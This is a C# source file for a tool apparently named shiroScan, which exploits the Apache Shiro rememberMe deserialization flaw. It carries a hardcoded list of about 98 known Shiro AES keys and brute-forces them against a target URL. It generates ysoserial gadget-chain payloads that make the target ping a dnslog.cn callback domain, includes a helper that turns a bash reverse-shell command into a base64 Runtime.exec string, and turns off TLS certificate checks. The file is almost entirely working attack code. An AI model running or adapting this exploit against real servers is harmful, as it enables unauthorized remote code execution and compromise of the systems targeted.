using System;
using System.IO;
using System.Text;
using org.apache.shiro.crypto;
using System.Diagnostics;
using System.Collections.Generic;
using System.Net;
using System.Threading;
using System.Text.RegularExpressions;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using sun.reflect.generics.tree;
using java.security;
using com.sun.tools.corba.se.idl.constExpr;

namespace shiroScan
{
    class Program
    {
        public static Dictionary<string, string> moduleList = new Dictionary<string, string>() 
        { 
            { "CB1", "CommonsBeanutils1" },  // commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
            { "CC1", "CommonsCollections1"}, // commons-collections:3.1
            { "CC2", "CommonsCollections2"}, // commons-collections4:4.0
            { "CC3", "CommonsCollections3"}, // commons-collections:3.1
            { "CC4", "CommonsCollections4"}, // commons-collections4:4.0
            { "CC5", "CommonsCollections5"}, // commons-collections:3.1
            { "CC6", "CommonsCollections6"}, // commons-collections:3.1
            { "CC7", "CommonsCollections7"}  // commons-collections:3.1
        };

        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("shiroScan.exe http?s://url");
                Process.GetCurrentProcess().Kill();
            }


            // 查看是否有rememberMe=deleteMe返回，以此判断是否为shiro
            int shiroNum = Tools.isShiro(args[0]);
            Console.WriteLine("shiroCookieCount：" + shiroNum);
            if (shiroNum <= 0)
            {
                Console.WriteLine("not shiro");
                Process.GetCurrentProcess().Kill();
            }
            else
            {
                Console.WriteLine("isShiro");
            }

            // 开始跑
            bool isSuccess = NoDnsScan.noDnsMain(args[0], shiroNum);
            if (!isSuccess)
            {
                Console.WriteLine("fail");
            }

            return;

            string dnslogSession = "PHPSESSID="+Guid.NewGuid().ToString();
            string dnslogDomain = "";
            using (var streamReader = new StreamReader(Tools.requestHttp("http://www.dnslog.cn/getdomain.php", dnslogSession).GetResponseStream()))
            {
                dnslogDomain = streamReader.ReadToEnd();
            }
            Console.WriteLine("dnslogSession -> " + dnslogSession);
            Console.WriteLine("dnslogDomain -> " + dnslogDomain);


            // 开始循环遍历module，每个module开一个线程去遍历key
            foreach (KeyValuePair<string, string> module in moduleList)
            {
                MyThread mtd = new MyThread();
                mtd.moduleKey = module.Key;
                mtd.moduleValue = module.Value;
                mtd.scanUri = args[0];
                mtd.dnslogSession = dnslogSession;
                mtd.dnslogDomain = dnslogDomain;

                new Thread(mtd.MyThreadMian).Start();
            }
        }
    }

    class NoDnsScan
    {
        static Dictionary<string, string> keyList = new Dictionary<string, string>()
        {
            {"k1","kPH+bIxk5D2deZiIxcaaaA=="},
            {"k2","4AvVhmFLUs0KTA3Kprsdag=="},
            {"k3","Z3VucwAAAAAAAAAAAAAAAA=="},
            {"k4","fCq+/xW488hMTCD+cmJ3aQ=="},
            {"k7","1QWLxg+NYmxraMoxAXu/Iw=="},
            {"k9","2AvVhdsgUs0FSA3SDFAdag=="},
            {"k10","3AvVhmFLUs0KTA3Kprsdag=="},
            {"k12","r0e3c16IdVkouZgk1TKVMg=="},
            {"k13","5aaC5qKm5oqA5pyvAAAAAA=="},
            {"k14","5AvVhmFLUs0KTA3Kprsdag=="},
            {"k17","6ZmI6I2j5Y+R5aSn5ZOlAA=="},
            {"k26","bWljcm9zAAAAAAAAAAAAAA=="},
            {"k27","bWluZS1hc3NldC1rZXk6QQ=="},
            {"k29","ZUdsaGJuSmxibVI2ZHc9PQ=="},
            {"k30","wGiHplamyXlVB11UXWol8g=="},
            {"k31","U3ByaW5nQmxhZGUAAAAAAA=="},
            {"k32","MTIzNDU2Nzg5MGFiY2RlZg=="},
            {"k33","L7RioUULEFhRyxM7a2R/Yg=="},
            {"k34","a2VlcE9uR29pbmdBbmRGaQ=="},
            {"k35","WcfHGU25gNnTxTlmJMeSpw=="},
            {"k5","0AvVhmFLUs0KTA3Kprsdag=="},
            {"k6","1AvVhdsgUs0FSA3SDFAdag=="},
            {"k8","25BsmdYwjnfcWmnhAciDDg=="},
            {"k11","3JvYhmBLUs0ETA5Kprsdag=="},
            {"k15","6AvVhmFLUs0KTA3Kprsdag=="},
            {"k16","6NfXkC7YVCV5DASIrEm1Rg=="},
            {"k18","cmVtZW1iZXJNZQAAAAAAAA=="},
            {"k19","7AvVhmFLUs0KTA3Kprsdag=="},
            {"k20","8AvVhmFLUs0KTA3Kprsdag=="},
            {"k21","8BvVhmFLUs0KTA3Kprsdag=="},
            {"k22","9AvVhmFLUs0KTA3Kprsdag=="},
            {"k23","OUHYQzxQ/W9e/UjiAGu6rg=="},
            {"k24","a3dvbmcAAAAAAAAAAAAAAA=="},
            {"k25","aU1pcmFjbGVpTWlyYWNsZQ=="},
            {"k28","bXRvbnMAAAAAAAAAAAAAAA=="},
            {"k36","OY//C4rhfwNxCQAQCrQQ1Q=="},
            {"k37","5J7bIJIV0LQSN3c9LPitBQ=="},
            {"k38","f/SY5TIve5WWzT4aQlABJA=="},
            {"k39","bya2HkYo57u6fWh5theAWw=="},
            {"k40","WuB+y2gcHRnY2Lg9+Aqmqg=="},
            {"k41","kPv59vyqzj00x11LXJZTjJ2UHW48jzHN"},
            {"k42","3qDVdLawoIr1xFd6ietnwg=="},
            {"k43","SDKOLKn2J1j/2BHjeZwAoQ=="},
            {"k44","YI1+nBV//m7ELrIyDHm6DQ=="},
            {"k45","6Zm+6I2j5Y+R5aS+5ZOlAA=="},
            {"k46","2A2V+RFLUs+eTA3Kpr+dag=="},
            {"k47","6ZmI6I2j3Y+R1aSn5BOlAA=="},
            {"k48","SkZpbmFsQmxhZGUAAAAAAA=="},
            {"k49","2cVtiE83c4lIrELJwKGJUw=="},
            {"k50","fsHspZw/92PrS3XrPW+vxw=="},
            {"k51","XTx6CKLo/SdSgub+OPHSrw=="},
            {"k52","sHdIjUN6tzhl8xZMG3ULCQ=="},
            {"k53","O4pdf+7e+mZe8NyxMTPJmQ=="},
            {"k54","HWrBltGvEZc14h9VpMvZWw=="},
            {"k55","rPNqM6uKFCyaL10AK51UkQ=="},
            {"k56","Y1JxNSPXVwMkyvES/kJGeQ=="},
            {"k57","lT2UvDUmQwewm6mMoiw4Ig=="},
            {"k58","MPdCMZ9urzEA50JDlDYYDg=="},
            {"k59","xVmmoltfpb8tTceuT5R7Bw=="},
            {"k60","c+3hFGPjbgzGdrC+MHgoRQ=="},
            {"k61","ClLk69oNcA3m+s0jIMIkpg=="},
            {"k62","Bf7MfkNR0axGGptozrebag=="},
            {"k63","1tC/xrDYs8ey+sa3emtiYw=="},
            {"k64","ZmFsYWRvLnh5ei5zaGlybw=="},
            {"k65","cGhyYWNrY3RmREUhfiMkZA=="},
            {"k66","IduElDUpDDXE677ZkhhKnQ=="},
            {"k67","yeAAo1E8BOeAYfBlm4NG9Q=="},
            {"k68","cGljYXMAAAAAAAAAAAAAAA=="},
            {"k69","2itfW92XazYRi5ltW0M2yA=="},
            {"k70","XgGkgqGqYrix9lI6vxcrRw=="},
            {"k71","ertVhmFLUs0KTA3Kprsdag=="},
            {"k72","5AvVhmFLUS0ATA4Kprsdag=="},
            {"k73","s0KTA3mFLUprK4AvVhsdag=="},
            {"k74","hBlzKg78ajaZuTE0VLzDDg=="},
            {"k75","9FvVhtFLUs0KnA3Kprsdyg=="},
            {"k76","d2ViUmVtZW1iZXJNZUtleQ=="},
            {"k77","yNeUgSzL/CfiWw1GALg6Ag=="},
            {"k78","NGk/3cQ6F5/UNPRh8LpMIg=="},
            {"k79","4BvVhmFLUs0KTA3Kprsdag=="},
            {"k80","MzVeSkYyWTI2OFVLZjRzZg=="},
            {"k82","empodDEyMwAAAAAAAAAAAA=="},
            {"k83","A7UzJgh1+EWj5oBFi+mSgw=="},
            {"k84","c2hpcm9fYmF0aXMzMgAAAA=="},
            {"k85","i45FVt72K2kLgvFrJtoZRw=="},
            {"k86","U3BAbW5nQmxhZGUAAAAAAA=="},
            {"k87","ZnJlc2h6Y24xMjM0NTY3OA=="},
            {"k88","Jt3C93kMR9D5e8QzwfsiMw=="},
            {"k89","MTIzNDU2NzgxMjM0NTY3OA=="},
            {"k90","vXP33AonIp9bFwGl7aT7rA=="},
            {"k91","V2hhdCBUaGUgSGVsbAAAAA=="},
            {"k92","Z3h6eWd4enklMjElMjElMjE=="},
            {"k93","Q01TX0JGTFlLRVlfMjAxOQ=="},
            {"k94","ZAvph3dsQs0FSL3SDFAdag=="},
            {"k95","Is9zJ3pzNh2cgTHB4ua3+Q=="},
            {"k96","NsZXjXVklWPZwOfkvk6kUA=="},
            {"k97","GAevYnznvgNCURavBhCr1w=="},
            {"k98","66v1O8keKNV3TTcGPK1wzg=="}
        };

        public static string getRememberMe(string keyS)
        {
            // 以字节形式读取 poc.ser 
            byte[] textBytes = File.ReadAllBytes($@"poc.ser");

            // new一个org.apache.shiro.crypto.AesCipherService，不需要额外设置，默认就是AES/128/CBC
            AesCipherService aesCipherService = new AesCipherService();
            // base64解码keyS为keyB
            // byte[] key = Convert.FromBase64String("kPH+bIxk5D2deZiIxcaaaA==");
            byte[] keyB = Convert.FromBase64String(keyS);
            // 调用shiro加密方法并返回byteArray
            byte[] encrptByte = aesCipherService.encrypt(textBytes, keyB).getBytes();
            // base64编码
            string encrptText = Convert.ToBase64String(encrptByte);

            return "rememberMe=" + encrptText;
        }

        public static bool noDnsMain(string uri, int shiroNum)
        {
            foreach (KeyValuePair<string, string> key in keyList)
            {
                string cookie = getRememberMe(key.Value);

                try
                {
                    HttpWebResponse response = Tools.requestHttp(uri, cookie);

                    string s = "";
                    foreach (var i in response.Headers.GetValues("Set-Cookie"))
                    {
                        s += i;
                    }
                    response.Close();
                    int shiroCookieCount = Tools.getRememberMeCount(s);
                    if (shiroCookieCount < shiroNum)
                    {
                        Console.WriteLine($"key is -> {key.Value}");
                        return true;
                    }
                }
                catch(Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
            return false;
        }
    }

    class Tools
    {
        public static bool CheckValidationResult(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors errors)
        {
            return true;
        }

        // 查看是否有rememberMe=deleteMe返回，并return标识rememberMe=deleteMe的数量
        public static int isShiro(string uri)
        {
            ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback(CheckValidationResult);

            HttpWebRequest request = WebRequest.Create(uri) as HttpWebRequest;
            request.Method = WebRequestMethods.Http.Get;
            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36";
            request.Headers.Add("Cookie", "rememberMe=isShiro");

            HttpWebResponse response = request.GetResponse() as HttpWebResponse;
            //Console.WriteLine((int)response.StatusCode);
            string s = "";
            foreach (var i in response.Headers.GetValues("Set-Cookie"))
            {
                s += i;
            }
            response.Close();

            int shiroCount = getRememberMeCount(s);

            return shiroCount;
        }

        // 获取rememberMe标识的数量
        public static int getRememberMeCount(string c)
        {
            int i = c.Split(new string[] { "rememberMe=deleteMe" }, StringSplitOptions.None).Length - 1;
            return i;
        }

        // 反弹shell时，转换为javaRuntime适用的字符串数组
        public static string bash_To_JavaRunTimeExec(string command)
        {
            return $"bash -c {{echo,{Convert.ToBase64String(Encoding.UTF8.GetBytes(command))}}}|{{base64,-d}}|{{bash,-i}}";
        }

        // 获取reMemberMe
        public static string get_rememberMe(string keyValue, string keyKey, string moduleValue, string moduleKey, string dnslogDomain)
        {
            // 生成一个序列化文件 payload.ser，以模块分线程并以模块名命名文件，防止冲突
            Process p = new Process();
            p.StartInfo.FileName = "cmd";
            //p.StartInfo.Arguments = @"/c java -jar ysoserial.jar JRMPClient ""101.201.56.18:999"" > payload.ser";
            //p.StartInfo.Arguments = @"/c java -jar ysoserial.jar CommonsCollections2 ""ping cc1.k2.65hos5.ceye.io"" > payload.ser";
            p.StartInfo.Arguments = $@"/c java -jar ysoserial.jar {moduleValue} ""ping {moduleKey}.{keyKey}.{dnslogDomain}"" > {moduleValue}.ser";
            //Console.WriteLine($"{moduleKey}.{keyKey}.{dnslogDomain}");
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            p.StandardOutput.ReadToEnd();
            p.Dispose();

            // 以字节形式读取 payload.ser 
            byte[] textBytes = File.ReadAllBytes($@"{moduleValue}.ser");

            // new一个org.apache.shiro.crypto.AesCipherService，不需要额外设置，默认就是AES/128/CBC，只需循环key爆破
            AesCipherService aesCipherService = new AesCipherService();
            // base64解码keyS为keyB
            byte[] keyB = Convert.FromBase64String(keyValue);
            // 调用shiro加密方法并返回byteArray
            byte[] encrptByte = aesCipherService.encrypt(textBytes, keyB).getBytes();
            // base64编码
            string encrptText = Convert.ToBase64String(encrptByte);
            return "rememberMe="+encrptText;
        }

        // http请求
        public static HttpWebResponse requestHttp(string uri, string cookies)
        {
            HttpWebRequest request = WebRequest.Create(uri) as HttpWebRequest;
            request.Method = WebRequestMethods.Http.Get;
            request.Timeout = 5000;
            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36";
            request.Headers.Add("Cookie", $"{cookies}");

            // 发起请求，并获取返回信息
            return request.GetResponse() as HttpWebResponse;


            // 响应状态转为响应码
            // Console.WriteLine((int)response.StatusCode);

            // Stream转为string
            //using (var streamReader = new StreamReader(response.GetResponseStream()))
            //{
            //    return streamReader.ReadToEnd();
            //}
        }
    }

    class XWebClient : WebClient
    {
        protected override WebRequest GetWebRequest(Uri address)
        {
            HttpWebRequest request = base.GetWebRequest(address) as HttpWebRequest;
            request.AutomaticDecompression = DecompressionMethods.Deflate | DecompressionMethods.GZip;
            return request;
        }
    }

    public class MyThread
    {
        static Dictionary<string, string> keyList = new Dictionary<string, string>()
        {
            {"k1","kPH+bIxk5D2deZiIxcaaaA=="},
            {"k2","4AvVhmFLUs0KTA3Kprsdag=="},
            {"k3","Z3VucwAAAAAAAAAAAAAAAA=="},
            {"k4","fCq+/xW488hMTCD+cmJ3aQ=="},
            {"k7","1QWLxg+NYmxraMoxAXu/Iw=="},
            {"k9","2AvVhdsgUs0FSA3SDFAdag=="},
            {"k10","3AvVhmFLUs0KTA3Kprsdag=="},
            {"k12","r0e3c16IdVkouZgk1TKVMg=="},
            {"k13","5aaC5qKm5oqA5pyvAAAAAA=="},
            {"k14","5AvVhmFLUs0KTA3Kprsdag=="},
            {"k17","6ZmI6I2j5Y+R5aSn5ZOlAA=="},
            {"k26","bWljcm9zAAAAAAAAAAAAAA=="},
            {"k27","bWluZS1hc3NldC1rZXk6QQ=="},
            {"k29","ZUdsaGJuSmxibVI2ZHc9PQ=="},
            {"k30","wGiHplamyXlVB11UXWol8g=="},
            {"k31","U3ByaW5nQmxhZGUAAAAAAA=="},
            {"k32","MTIzNDU2Nzg5MGFiY2RlZg=="},
            {"k33","L7RioUULEFhRyxM7a2R/Yg=="},
            {"k34","a2VlcE9uR29pbmdBbmRGaQ=="},
            {"k35","WcfHGU25gNnTxTlmJMeSpw=="},
            {"k5","0AvVhmFLUs0KTA3Kprsdag=="},
            {"k6","1AvVhdsgUs0FSA3SDFAdag=="},
            {"k8","25BsmdYwjnfcWmnhAciDDg=="},
            {"k11","3JvYhmBLUs0ETA5Kprsdag=="},
            {"k15","6AvVhmFLUs0KTA3Kprsdag=="},
            {"k16","6NfXkC7YVCV5DASIrEm1Rg=="},
            {"k18","cmVtZW1iZXJNZQAAAAAAAA=="},
            {"k19","7AvVhmFLUs0KTA3Kprsdag=="},
            {"k20","8AvVhmFLUs0KTA3Kprsdag=="},
            {"k21","8BvVhmFLUs0KTA3Kprsdag=="},
            {"k22","9AvVhmFLUs0KTA3Kprsdag=="},
            {"k23","OUHYQzxQ/W9e/UjiAGu6rg=="},
            {"k24","a3dvbmcAAAAAAAAAAAAAAA=="},
            {"k25","aU1pcmFjbGVpTWlyYWNsZQ=="},
            {"k28","bXRvbnMAAAAAAAAAAAAAAA=="},
            {"k36","OY//C4rhfwNxCQAQCrQQ1Q=="},
            {"k37","5J7bIJIV0LQSN3c9LPitBQ=="},
            {"k38","f/SY5TIve5WWzT4aQlABJA=="},
            {"k39","bya2HkYo57u6fWh5theAWw=="},
            {"k40","WuB+y2gcHRnY2Lg9+Aqmqg=="},
            {"k41","kPv59vyqzj00x11LXJZTjJ2UHW48jzHN"},
            {"k42","3qDVdLawoIr1xFd6ietnwg=="},
            {"k43","SDKOLKn2J1j/2BHjeZwAoQ=="},
            {"k44","YI1+nBV//m7ELrIyDHm6DQ=="},
            {"k45","6Zm+6I2j5Y+R5aS+5ZOlAA=="},
            {"k46","2A2V+RFLUs+eTA3Kpr+dag=="},
            {"k47","6ZmI6I2j3Y+R1aSn5BOlAA=="},
            {"k48","SkZpbmFsQmxhZGUAAAAAAA=="},
            {"k49","2cVtiE83c4lIrELJwKGJUw=="},
            {"k50","fsHspZw/92PrS3XrPW+vxw=="},
            {"k51","XTx6CKLo/SdSgub+OPHSrw=="},
            {"k52","sHdIjUN6tzhl8xZMG3ULCQ=="},
            {"k53","O4pdf+7e+mZe8NyxMTPJmQ=="},
            {"k54","HWrBltGvEZc14h9VpMvZWw=="},
            {"k55","rPNqM6uKFCyaL10AK51UkQ=="},
            {"k56","Y1JxNSPXVwMkyvES/kJGeQ=="},
            {"k57","lT2UvDUmQwewm6mMoiw4Ig=="},
            {"k58","MPdCMZ9urzEA50JDlDYYDg=="},
            {"k59","xVmmoltfpb8tTceuT5R7Bw=="},
            {"k60","c+3hFGPjbgzGdrC+MHgoRQ=="},
            {"k61","ClLk69oNcA3m+s0jIMIkpg=="},
            {"k62","Bf7MfkNR0axGGptozrebag=="},
            {"k63","1tC/xrDYs8ey+sa3emtiYw=="},
            {"k64","ZmFsYWRvLnh5ei5zaGlybw=="},
            {"k65","cGhyYWNrY3RmREUhfiMkZA=="},
            {"k66","IduElDUpDDXE677ZkhhKnQ=="},
            {"k67","yeAAo1E8BOeAYfBlm4NG9Q=="},
            {"k68","cGljYXMAAAAAAAAAAAAAAA=="},
            {"k69","2itfW92XazYRi5ltW0M2yA=="},
            {"k70","XgGkgqGqYrix9lI6vxcrRw=="},
            {"k71","ertVhmFLUs0KTA3Kprsdag=="},
            {"k72","5AvVhmFLUS0ATA4Kprsdag=="},
            {"k73","s0KTA3mFLUprK4AvVhsdag=="},
            {"k74","hBlzKg78ajaZuTE0VLzDDg=="},
            {"k75","9FvVhtFLUs0KnA3Kprsdyg=="},
            {"k76","d2ViUmVtZW1iZXJNZUtleQ=="},
            {"k77","yNeUgSzL/CfiWw1GALg6Ag=="},
            {"k78","NGk/3cQ6F5/UNPRh8LpMIg=="},
            {"k79","4BvVhmFLUs0KTA3Kprsdag=="},
            {"k80","MzVeSkYyWTI2OFVLZjRzZg=="},
            {"k82","empodDEyMwAAAAAAAAAAAA=="},
            {"k83","A7UzJgh1+EWj5oBFi+mSgw=="},
            {"k84","c2hpcm9fYmF0aXMzMgAAAA=="},
            {"k85","i45FVt72K2kLgvFrJtoZRw=="},
            {"k86","U3BAbW5nQmxhZGUAAAAAAA=="},
            {"k87","ZnJlc2h6Y24xMjM0NTY3OA=="},
            {"k88","Jt3C93kMR9D5e8QzwfsiMw=="},
            {"k89","MTIzNDU2NzgxMjM0NTY3OA=="},
            {"k90","vXP33AonIp9bFwGl7aT7rA=="},
            {"k91","V2hhdCBUaGUgSGVsbAAAAA=="},
            {"k92","Z3h6eWd4enklMjElMjElMjE=="},
            {"k93","Q01TX0JGTFlLRVlfMjAxOQ=="},
            {"k94","ZAvph3dsQs0FSL3SDFAdag=="},
            {"k95","Is9zJ3pzNh2cgTHB4ua3+Q=="},
            {"k96","NsZXjXVklWPZwOfkvk6kUA=="},
            {"k97","GAevYnznvgNCURavBhCr1w=="},
            {"k98","66v1O8keKNV3TTcGPK1wzg=="}
        };
        public string moduleValue;
        public string moduleKey;
        public string scanUri;
        public string dnslogSession;
        public string dnslogDomain;

        public void MyThreadMian()
        {
            // 循环key
            foreach (KeyValuePair<string, string> key in keyList)
            {
                string rememberMe = Tools.get_rememberMe(key.Value, key.Key, moduleValue, moduleKey, dnslogDomain);

                // Console.WriteLine($"{moduleValue} - {key.Value}");
                Tools.requestHttp(scanUri, rememberMe);

                string dnslog = "";
                using (var streamReader = new StreamReader(Tools.requestHttp("http://www.dnslog.cn/getrecords.php", dnslogSession).GetResponseStream()))
                {
                    dnslog = streamReader.ReadToEnd();
                }

                if (dnslog.Length > 2)
                {
                    string[] dnsResultList = new Regex(@".{3}\..{2}\..{6}\..{6}\..{2}").Match(dnslog).Value.Split('.');

                    Console.BackgroundColor = ConsoleColor.Red;
                    Console.WriteLine("存在漏洞：");
                    Console.WriteLine("module：" + Program.moduleList[dnsResultList[0]]);
                    Console.WriteLine("key：" + keyList[dnsResultList[1]]);
                    Console.BackgroundColor = ConsoleColor.Black;

                    Process.GetCurrentProcess().Kill();
                }
            }
        }
    }
}

